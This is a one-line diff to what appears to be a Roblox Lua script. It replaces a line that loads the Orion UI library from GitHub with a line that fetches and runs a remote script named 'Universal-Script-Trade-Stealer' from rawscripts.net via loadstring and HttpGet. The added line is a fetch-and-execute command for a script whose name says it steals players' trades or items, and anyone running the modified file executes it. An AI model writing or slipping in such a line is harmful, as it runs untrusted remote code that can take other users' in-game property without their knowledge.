@@ -1,1 +1,1 @@
-local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Ori
+loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Trade-Stealer-34808"))()
